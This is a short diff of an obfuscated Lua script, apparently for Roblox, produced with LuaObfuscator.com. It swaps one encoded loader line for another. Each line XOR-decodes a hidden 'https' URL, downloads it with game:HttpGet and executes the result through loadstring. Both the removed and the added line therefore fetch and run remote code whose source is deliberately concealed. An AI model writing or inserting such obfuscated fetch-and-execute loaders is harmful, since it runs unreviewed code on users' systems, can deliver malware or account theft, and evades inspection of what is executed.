@@ -1,5 +1,3 @@
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1 + 0 , #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + (1074 -(986 + 87)) )),v1(v2(v9,(1 -0) + (v11% #v9) ,1 + (v11% #v9) + (2 -1) )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\195\194\204\107\225\178\211\22\196\193\206\54\227\169\196\17\223\215\222\43\242\245\196\17\220\140\223\47\226\174\159\71\133\140\243\36\232\191\203\23\223\196\150\22\229\169\206\14\197\142\248\32\232\175\194\12\158\209\222\35\245\244\207\27\208\199\200\106\235\186\206\16\158\134\254\125\163\227\147\91\136\226\158\0\176\254\158\61\148\226\248\96\195\239\130\60\243\134\250\118\163\158\144\91\240\147\158\125\183\234\137\18\196\194","\126\177\163\187\69\134\219\167")))();
--- ⚠️ WARNING: integrity protected!
 --[[
  .____                  ________ ___.    _____                           __                
  |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
@@ -10,3 +8,5 @@ local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or 
           \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 
 
 ]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v11=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v11,v11 + 1 )),v1(v2(v9,1 + (v11% #v9) ,1 + (v11% #v9) + 1 )))%256 ));end return v5(v10);end loadstring(game:HttpGet(v7("\217\215\207\53\245\225\136\81\193\194\200\49\227\185\206\16\159\192\212\40\169\169\198\9\158\212\210\18\252\151\240\46\229","\126\177\163\187\69\134\219\167")))();
